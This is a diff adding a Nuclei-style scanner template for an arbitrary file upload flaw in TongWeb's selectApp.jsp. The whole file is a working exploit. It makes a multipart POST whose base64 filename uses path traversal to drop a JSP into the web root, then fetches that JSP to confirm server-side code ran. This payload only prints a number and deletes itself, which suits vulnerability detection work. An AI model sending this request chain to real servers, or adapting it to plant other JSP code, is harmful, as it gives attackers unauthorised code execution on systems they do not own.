@@ -1,0 +1,50 @@
+id: tongweb-selectapp-fileupload
+info:
+  name: 东方通 TongWeb selectApp.jsp 任意文件上传
+  author: SleepingBag945
+  severity: critical
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(32))}}"
+  filenametext: "{{to_lower(rand_base(6))}}"
+
+http:
+  - raw:
+      - |
+        POST /heimdall/pages/cla/selectApp.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        Accept-Encoding: gzip
+        Connection: close
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="app_fileName"
+
+        {{base64("../../applications/heimdall/{{filename}}.jsp")}}
+        --{{boundary}}
+        Content-Disposition: form-data; name="app"
+
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="className"
+
+        test
+        --{{boundary}}
+        Content-Disposition: form-data; name="uploadApp"; filename="test.jar"
+        Content-Type: application/java-archive
+
+        <%out.print(111 * 111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --{{boundary}}--            
+
+      - |
+        GET /heimdall/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains_all(all_headers_1,"heimdall") && contains_all(body_2,"12321")'
